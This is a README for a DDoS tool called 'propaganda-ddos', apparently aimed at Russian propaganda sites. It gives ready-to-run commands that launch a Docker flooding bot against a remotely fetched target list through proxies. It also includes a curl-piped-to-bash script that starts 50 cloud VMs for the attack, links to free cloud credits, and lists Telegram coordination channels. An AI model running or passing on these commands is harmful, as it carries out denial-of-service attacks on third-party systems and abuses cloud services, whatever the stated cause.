# propaganda-ddos

```bash
docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=30 --dnsres=true \
    --onlyproxy=false --bots 50 --checkproxy=true \
		--sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
		--proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json

# Щоб побачити логи
docker logs antiprop -f
```


### Запуск в GCP vms / Run in GCP vms
```bash
# Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 50
```

### Використання / Usage
```bash
docker run --rm lovefromukraine/antiprop --help
```

### Де запускати? / Where to run?
- [Guide GCP (free 300$)](https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit) 
- [Microsoft Azure (free 200$)](https://dou.ua/forums/topic/36795/?from=fptech)
- [Amazon AWS (free 200$)](https://www.youtube.com/playlist?list=PLY1sAemBLA5ztXFauZJU1b292umoWMeZ4)

# Coordination
- https://t.me/itarmyofukraine2022 (english posts are included)
- https://t.me/ddosKotyky
- https://t.me/incourse911
